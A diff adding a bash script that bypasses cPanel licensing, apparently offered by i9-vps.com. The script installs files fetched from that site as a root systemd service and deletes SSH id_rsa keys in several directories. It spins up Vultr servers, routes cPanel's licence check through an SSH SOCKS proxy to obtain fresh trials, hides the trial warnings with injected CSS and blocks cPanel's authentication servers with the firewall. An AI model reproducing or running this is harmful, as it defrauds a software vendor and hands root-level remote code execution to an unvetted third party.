@@ -1,0 +1,353 @@
+#!/bin/bash
+
+RED='\033[0;31m' # Red
+Green='\033[0;36m'        # Green
+Green1='\033[0;92m'        # Green
+NC='\033[0m' # No Color
+Yellow='\033[0;33m'        # Yellow
+key='cpanel'
+api="https://i9-vps.com/api/getinfo.json"
+api_license="https://i9-vps.com/api/getinfo.json"
+status_code=$(curl -LI "$api" -o /dev/null -w '%{http_code}\n' -s)
+plast_bin="/usr/bin/plast"
+current_ip=$(curl https://ipinfo.io/ip)
+domain_show=""
+brand_show=""
+hostname_show=$( hostname )
+server_type="VPS"
+status=false
+server_range=0
+firewall_stop='false'
+firewall_stop_1='false'
+running='false'
+action="$1"
+
+
+
+
+installService() {
+
+echo "Installing Service" 
+sleep 3
+rm -r /etc/i9
+mkdir /etc/i9
+cd /etc/i9
+wget i9-vps.com/api/i9.service > /dev/null 2>&1
+wget i9-vps.com/api/install > /dev/null 2>&1
+wget i9-vps.com/api/cron > /dev/null 2>&1
+wget i9-vps.com/api/check_cpanel.php > /dev/null 2>&1
+chmod +x cron 
+chmod +x install
+chmod +x check_cpanel.php
+chmod +x i9.service
+cp  i9.service /etc/systemd/system/i9.service
+systemctl daemon-reload
+systemctl start i9.service 
+systemctl enable i9.service > /dev/null 2>&1
+systemctl status i9.service > /dev/null 2>&1
+sleep 3
+
+}
+
+
+
+
+
+if [ "$action" == '--help' ] || [ "$action" == '-h' ] ;then
+    echo ""
+    echo ""
+    printf "${Green}Command Lines${NC}\n"
+    printf "${Green}--uninstall  : uninstall license  ${NC}\n"
+    printf "${Green}--enable     : enable    license ${NC}\n"
+    printf "${Green}--disable    : disable   license ${NC}\n"
+    printf "${Green}--force      : force     license updates ${NC}\n"
+    exit 0
+fi
+echo ""
+if ! [ -x "$(command -v python)" ]; then
+
+    printf "${RED}python is not installed${NC}\n"
+    echo ""
+    exit 1
+fi
+if [ ! -f "/usr/local/cpanel/cpkeyclt" ]; then
+    printf "${RED}Cpanel is not detected${NC}\n"
+    printf "${RED}You need to install Cpanel${NC}\n"
+    echo ""
+    exit 1
+fi
+
+
+
+
+
+
+output=$( curl -s   "$api" )
+if [ "$status_code" != "200"  ];then
+printf "${RED}Something Went Wrong [Unknown Ip]  ${NC}\n"
+echo ""
+exit 1
+fi
+
+expire_date=$(echo $output | \
+    python -c 'import json,sys;obj=json.load(sys.stdin);print(obj["expire_date"]);')
+get_domain_show=$(echo $output | \
+    python -c 'import json,sys;obj=json.load(sys.stdin);print(obj["domain_name"]);')
+get_brand_show=$(echo $output | \
+    python -c 'import json,sys;obj=json.load(sys.stdin);print(obj["brand_name"]);')
+get_stat=$(echo $output | \
+    python -c 'import json,sys;obj=json.load(sys.stdin);print(obj["status"]);')
+get_head=$(echo $output | \
+    python -c 'import json,sys;obj=json.load(sys.stdin);print(obj["get_head"]);')
+API=$(echo $output | \
+    python -c 'import json,sys;obj=json.load(sys.stdin);print(obj["API"]);')
+
+
+if [ "$get_domain_show" != '' ];then
+domain_show="$get_domain_show"
+fi
+if [ "$get_brand_show" != '' ];then
+brand_show="$get_brand_show"
+fi
+
+
+clear
+if [ "$EUID" -ne 0 ]
+  then echo "Please run as root"
+  exit
+fi
+banner() {
+VERSION="5"
+myip="$(dig +short myip.opendns.com @resolver1.opendns.com)"
+echo "--------------------------------%  %--------------------------------"
+echo ""
+printf "${Green}Server Ads:${get_head}${NC}\n"
+printf "${Green}Our Website: ${domain_show} ${NC}\n"
+printf "${Green}Server IP: ${current_ip} ${NC}\n"
+printf "${Green}Hostname: ${hostname_show} ${NC}\n"
+printf "${Green}License type: ${server_type} ${NC}\n"
+printf "${Green}Expiry date: ${expire_date} ${NC}\n"
+echo ""
+echo "--------------------------------%  %--------------------------------"
+echo ""
+
+
+file=/root/settings
+if [ -e "$file" ]; then
+    echo "config found!"
+	
+value=`cat settings`  
+echo "$value"  
+else 
+echo "Vultr Key not set!"
+read -p "Enter Your Vultr Key: " value
+printf "Vultr Key set to ${Green}${value}${NC}\n"
+echo "${Key}" >> settings
+fi 
+
+
+sleep 3
+printf "${Green}Please Wait...${NC}\n"
+echo ""
+echo "--------------------------------%  %--------------------------------"
+echo ""
+printf "${Yellow}Copyright © 2019-2020 ${brand_show} . All rights reserved${NC}\n"
+printf "${Yellow}To install as service use --install-service${NC}\n"
+echo ""
+sleep 4
+}
+
+requirements() {
+F=$(pwd)
+
+if [ ! -d "/usr/local/cpanel" ]
+then
+echo "cPanel not detected, installing..."
+yum  -y -d 0 -e 0 remove NetworkManager
+cd /home && curl -o latest -L https://securedownloads.cpanel.net/latest && sh latest
+fi
+if [ ! -d "/usr/local/bin/proxychains4" ]
+then
+echo "proxychains4 not detected, installing..."
+cd /
+git clone https://github.com/rofl0r/proxychains-ng.git
+cd proxychains-ng > /dev/null 2>&1
+./configure > /dev/null 2>&1
+make > /dev/null 2>&1
+make install > /dev/null 2>&1
+cd ../ > /dev/null 2>&1
+rm -rf proxychains-ng > /dev/null 2>&1
+
+fi
+echo ""
+
+if [ ! -d "id_rsa" ]
+then
+echo ""
+echo "id_rsa detected, removing...\n"
+rm -f id_rsa id_rsa.pub 2> /dev/null
+fi
+sleep 5
+printf "${RED}Trying to force Removing Keys ${NC}"
+cd /
+echo ""
+printf "${Yellow}Entering / ${NC}"
+echo ""
+rm -f id_rsa id_rsa.pub 2> /dev/null
+
+cd  /root
+echo ""
+printf "${Yellow}Entering /root ${NC}"
+echo ""
+rm -f id_rsa id_rsa.pub 2> /dev/null
+
+cd 
+echo ""
+printf "${Yellow}Entering  ${NC}"
+echo ""
+rm -f id_rsa id_rsa.pub 2> /dev/null
+
+cd /home
+echo ""
+printf "${Yellow}Entering /home ${NC}"
+echo ""
+rm -f id_rsa id_rsa.pub 2> /dev/null
+
+
+ssh-keygen -b 2048 -t rsa -f id_rsa -q -N ""
+yum  -y -d 0 -e 0 install git curl make gcc bc python
+
+
+
+
+}
+
+test_vultr() {
+VULTR_TOKEN="${value}"
+VULTR_TOKEN=$(echo "${VULTR_TOKEN//[$'\t\r\n']}")
+echo ""
+printf "${Green1} ***** Testing VULTR API ***** ${NC}\n"
+echo ""
+printf "${Green1} Using API Key: $VULTR_TOKEN${NC}\n"
+printf "${Green1} Testing Connection to Vultr.......${NC}\n"
+RESPONSE=$(curl -s -H "API-Key: ${API//[$'\t\r\n ']}" https://api.vultr.com/v1/account/info)
+if [[ $RESPONSE == *"is not authorized to use this API key"* ]]; then
+  echo "Please make sure that your public ip is added to the vultr whitelist.";
+  echo "If you are still having issues, please contact support";
+  exit 1;
+fi
+if [[ $RESPONSE == *"Invalid API key"* ]]; then
+  echo $RESPONSE;
+  exit 1;
+fi
+BALANCE=$(echo $RESPONSE | python -c "import sys, json; print(json.load(sys.stdin)['balance'])")
+zero="0.00"
+printf "${Green1}Vultr is okay!${NC}\n"
+}
+
+
+
+
+
+
+urlencode() {
+    # urlencode <string>
+
+    old_lc_collate=$LC_COLLATE
+    LC_COLLATE=C
+
+    local length="${#1}"
+    for (( i = 0; i < length; i++ )); do
+        local c="${1:$i:1}"
+        case $c in
+            [a-zA-Z0-9.~_-]) printf '%s' "$c" ;;
+            *) printf '%%%02X' "'$c" ;;
+        esac
+    done
+
+    LC_COLLATE=$old_lc_collate
+}
+
+urldecode() {
+    # urldecode <string>
+
+    local url_encoded="${1//+/ }"
+    printf '%b' "${url_encoded//%/\\x}"
+}
+create_serv() {
+VULTR_TOKEN="${value}"
+VULTR_TOKEN=$(echo "${VULTR_TOKEN//[$'\t\r\n']}")
+KEY_TO_UPLOAD=$(urlencode "$(cat id_rsa.pub)")
+NEW_UUID="DL2$(( ( RANDOM % 50000 )  + 30000 ))"
+RESPONSE=$(curl -s -d "name=${NEW_UUID//[$'\t\r\n ']}&ssh_key=${KEY_TO_UPLOAD//[$'\t\r\n ']}" "https://api.vultr.com/v1/sshkey/create?api_key=${VULTR_TOKEN//[$'\t\r\n ']}")
+SSHKEYID=$(echo $RESPONSE | python -c "import sys, json; print(json.load(sys.stdin)['SSHKEYID'])")
+RESPONSE=$(curl -s -d "SSHKEYID=${SSHKEYID//[$'\t\r\n ']}&DCID=1&VPSPLANID=202&OSID=186&APPID=38" "https://api.vultr.com/v1/server/create?api_key=${VULTR_TOKEN//[$'\t\r\n ']}")
+SUBID=$(echo $RESPONSE | python -c "import sys, json; print(json.load(sys.stdin)['SUBID'])")
+if [ "$SUBID" == "" ]; then
+  echo "An unexpected error occured. Did vultr block your account or update its api??";
+  echo "Please contact support, this is not normal."
+  exit 1;
+fi
+printf "${Green1}SSH KEY ID: $SSHKEYID${NC}\n"
+printf "${Green1}VM ID: $SUBID${NC}\n"
+while :
+do
+        RESPONSE=$(curl -s -H "API-Key: ${VULTR_TOKEN//[$'\t\r\n ']}" https://api.vultr.com/v1/server/list)
+        STATUS=$(echo $RESPONSE | python -c "import sys, json; print(json.load(sys.stdin)['${SUBID//[$'\t\r\n ']}']['status'])")
+        RUNNING=$(echo $RESPONSE | python -c "import sys, json; print(json.load(sys.stdin)['${SUBID//[$'\t\r\n ']}']['power_status'])")
+        MAINIP=$(echo $RESPONSE | python -c "import sys, json; print(json.load(sys.stdin)['${SUBID//[$'\t\r\n ']}']['main_ip'])")
+        SSHSTATUS=$(timeout 2 bash -c "</dev/tcp/${MAINIP//[$'\t\r\n ']}/80"; echo $?)
+        DPASS=$(echo $RESPONSE | python -c "import sys, json; print(json.load(sys.stdin)['${SUBID//[$'\t\r\n ']}']['default_password'])")
+        #echo "Status: $STATUS Running: $RUNNING SSH: $SSHSTATUS"
+        if [[ "$STATUS" == "active" ]]; then
+          if [[ "$RUNNING" == "running" ]]; then
+             if [[ "$SSHSTATUS" == "0" ]]; then
+               break;
+             fi
+          fi
+        fi
+        sleep 5
+done
+
+
+
+
+echo ""
+printf "${Yellow} ***** CPANEL LICENSE *****"
+echo ""
+PROXYPORT=$(( ( RANDOM % 50000 )  + 30000 ))
+echo "strict_chain" >> proxychains.conf
+echo "proxy_dns" >> proxychains.conf
+echo "[ProxyList]" >> proxychains.conf
+echo "socks5 127.0.0.1 $PROXYPORT" >> proxychains.conf
+echo "Starting Services...";
+ssh -D $PROXYPORT -C -N -q -f -i id_rsa -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no root@$MAINIP <<< $DPASS
+php -r "shell_exec('ssh -D ${PROXYPORT//[$'\t\r\n ']} -f -i id_rsa  -C -q -N -oStrictHostKeyChecking=no root@${MAINIP//[$'\t\r\n ']} > /dev/null 2>&1');"
+
+
+proxychains4 -q -f proxychains.conf /usr/local/cpanel/cpkeyclt --force
+
+rm -rf proxychains.conf
+echo ""
+echo " ***** CLEANUP *****"
+echo ""
+curl -s -d "SUBID=${SUBID//[$'\t\r\n ']}" "https://api.vultr.com/v1/server/destroy?api_key=${VULTR_TOKEN//[$'\t\r\n ']}"
+curl -s -d "SSHKEYID=${SSHKEYID//[$'\t\r\n ']}" "https://api.vultr.com/v1/sshkey/destroy?api_key=${VULTR_TOKEN//[$'\t\r\n ']}"
+rm -rf id_rsa id_rsa.pub
+php -r '$a = file_get_contents("/usr/local/cpanel/base/frontend/paper_lantern/_assets/css/master-ltr.cmb.min.css");if (strpos($a, "#trialWarningBlock{display:none;}") !== false){}else{     file_put_contents("/usr/local/cpanel/base/frontend/paper_lantern/_assets/css/master-ltr.cmb.min.css", $a . "#trialWarningBlock{display:none;}");}$a = file_get_contents("/usr/local/cpanel/whostmgr/docroot/styles/master-ltr.cmb.min.css");if (strpos($a, "#divTrialLicenseWarning{display:none}") !== false){}else{     file_put_contents("/usr/local/cpanel/whostmgr/docroot/styles/master-ltr.cmb.min.css", $a . "#divTrialLicenseWarning{display:none}");}'
+php -r 'echo "\nBlocking cPanel Auth IP...\n";    $cpanel_host_ip = shell_exec("host auth.cpanel.net | cut -c 29-");    $cpanel_host_ip = explode("\n", $cpanel_host_ip);    foreach ($cpanel_host_ip as $need_to_block)    {        if (!$need_to_block == ""){     echo "Blocking IP $need_to_block...\n";            shell_exec("csf -d $need_to_block");        }    }'
+}
+
+banner
+if [[ $1 = "--install-service" ]]; then
+installService
+exit
+fi
+installService
+requirements
+test_vultr
+create_serv
+printf "${Green1} cPanel has been licensed and activated!"
+
+
+
